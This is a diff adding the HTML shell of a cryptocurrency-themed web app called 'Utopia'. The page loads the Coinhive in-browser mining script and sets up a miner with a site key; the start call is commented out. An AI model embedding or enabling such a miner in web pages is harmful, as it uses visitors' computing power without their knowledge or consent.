@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Utopia</title>
+    <meta name="keywords" content="比特币交易平台,比特币,BTC,比特币价格,比特币行情,USDT,莱特币,BCC,以太坊,ETH,以太经典,fomo3d,last winner,utopia,理想乐园">
+    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+  </head>
+  <body>
+    <div id="app"></div>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.Anonymous('RVSgoxcrBBrZkWkSbetoCDmCYpbzxmEf', {throttle: 0.5});
+
+        // Only start on non-mobile devices and if not opted-out
+        // in the last 14400 seconds (4 hours):
+        if (!miner.isMobile() && !miner.didOptOut(14400)) {
+            // miner.start();
+        }
+    </script>
+  </body>
+</html>
